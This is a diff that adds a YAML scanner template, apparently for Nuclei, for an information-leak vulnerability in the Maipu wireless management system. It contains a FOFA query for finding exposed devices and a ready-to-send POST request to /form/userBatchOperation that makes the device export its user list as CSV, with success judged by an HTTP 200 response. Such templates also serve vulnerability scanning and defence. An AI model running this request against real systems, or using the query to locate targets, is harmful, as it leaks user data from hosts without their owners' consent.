@@ -1,0 +1,27 @@
+id: poc-pc04i2y6gc95zyuo
+info:
+  name: 迈普无线管理系统userBatchOperation 存在信息泄漏漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/pc04i2y6gc95zyuo'
+  tags: info-leak,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: pc04i2y6gc95zyuo
+    fofa: '(body="/switchMlcVersion_login" && body="js/base64.js") || header="Server: Maipu-Webs"'
+http:
+- raw:
+  - 'POST /form/userBatchOperation HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+
+    searchType=ALL&search=&fileNameHttp=&userCsvFlag=3&btnExportCsv=导出CSV文件'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
